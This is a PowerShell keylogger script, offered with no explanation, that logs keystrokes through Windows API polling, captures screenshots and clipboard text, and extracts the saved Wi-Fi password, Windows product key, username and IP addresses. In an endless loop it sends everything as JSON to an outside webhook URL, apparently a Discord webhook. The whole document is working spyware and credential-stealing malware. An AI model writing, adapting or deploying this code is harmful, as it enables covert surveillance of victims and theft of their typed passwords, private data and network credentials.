# Set the webhook URL and shorten if necessary
if ($dc.Ln -ne 121) {
    $dc = (Invoke-RestMethod -Uri $dc).url
}

# Import necessary Windows API functions
$Async = @"
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
"@
$Type = Add-Type -MemberDefinition $Async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru

$API = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru

# Set up stopwatch for keypress detection
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)

# Function to capture a screenshot
function Capture-Screenshot {
    Add-Type -AssemblyName System.Drawing
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $stream = New-Object System.IO.MemoryStream
    $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
    $stream.ToArray()
}

# Function to retrieve system information
function Get-SystemInfo {
    $sysinfo = @{
        "OS" = [System.Environment]::OSVersion.VersionString
        "Architecture" = [System.Environment]::Is64BitOperatingSystem ? "64-bit" : "32-bit"
        "MachineName" = [System.Environment]::MachineName
        "UserName" = [System.Environment]::UserName
        "CPU" = (Get-WmiObject -Class Win32_Processor).Name
        "RAM" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
        "WinProductKey" = (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey
        "LogPath" = "$env:TEMP\pAnKPkWN.log"
    }
    return $sysinfo
}

# Function to retrieve public IP address
function Get-PublicIP {
    try {
        $response = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
        return $response.ip
    } catch {
        return "Unable to retrieve IP"
    }
}

# Function to retrieve internal IP address
function Get-InternalIP {
    try {
        $internalIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Ethernet').IPAddress
        return $internalIP
    } catch {
        return "Unable to retrieve IP"
    }
}

# Function to retrieve Wi-Fi password
function Get-WiFiPassword {
    try {
        $wifiName = (netsh wlan show interfaces | Select-String '^SSID' | ForEach-Object { $_.ToString().Split(":")[1].Trim() })
        $wifiPass = (netsh wlan show profiles name="$wifiName" key=clear | Select-String 'Key Content' | ForEach-Object { $_.ToString().Split(":")[1].Trim() })
        return $wifiPass
    } catch {
        return "Unable to retrieve Wi-Fi password"
    }
}

# Function to retrieve clipboard content
function Get-ClipboardContent {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Clipboard]::GetText()
}

# Advanced logging and reporting mechanism
function Report-Data {
    param (
        $keyPressed,
        $clipboardContent
    )

    $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"

    $screenshotBytes = Capture-Screenshot
    $screenshotBase64 = [Convert]::ToBase64String($screenshotBytes)

    $systemInfo = Get-SystemInfo
    $publicIP = Get-PublicIP
    $internalIP = Get-InternalIP
    $wifiPassword = Get-WiFiPassword

    $escmsgsys = $keyPressed -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
    $escmsgsys += "`nClipboard: $clipboardContent"

    $jsonsys = @{
        "username" = "$env:COMPUTERNAME"
        "content" = "`n**Key Logger Initialized**`n`n**PC Information**`nOS : $($systemInfo.OS)`nOS Archit: $($systemInfo.Architecture)`nWin PrKey: $($systemInfo.WinProductKey)`nPC CPU : $($systemInfo.CPU)`nPC RAM : $($systemInfo.RAM) GB`n`n**Script Information**`nLog Path : $($systemInfo.LogPath)`n`n**User Information**`nUsername : $($systemInfo.UserName)`nPC Name : $($systemInfo.MachineName)`nExt IP : $publicIP`nInt IP : $internalIP`n`nWiFi Pass: $wifiPassword"
        "screenshot" = $screenshotBase64
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
}

# Main loop for keylogging
While ($true) {
    $keyPressed = $false
    $clipboardContent = Get-ClipboardContent

    try {
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++) {
                $keyst = $API::GetAsyncKeyState($asc)
                if ($keyst -eq -32767) {
                    $keyPressed = $true
                    $LastKeypressTime.Restart()
                    $null = [console]::CapsLock
                    $vtkey = $API::MapVirtualKey($asc, 3)
                    $kbst = New-Object Byte[] 256
                    $checkkbst = $API::GetKeyboardState($kbst)
                    $logchar = New-Object -TypeName System.Text.StringBuilder
                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                        $LString = $logchar.ToString()
                        switch ($asc) {
                            8 { $LString = "[BKSP]" }
                            13 { $LString = "[ENT]" }
                            27 { $LString = "[ESC]" }
                            default { }
                        }
                        $send += $LString
                    }
                }
            }
        }
    }
    finally {
        if ($keyPressed -or $clipboardContent) {
            Report-Data $send $clipboardContent
            $send = ""
            $keyPressed = $false
        }
    }

    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
}
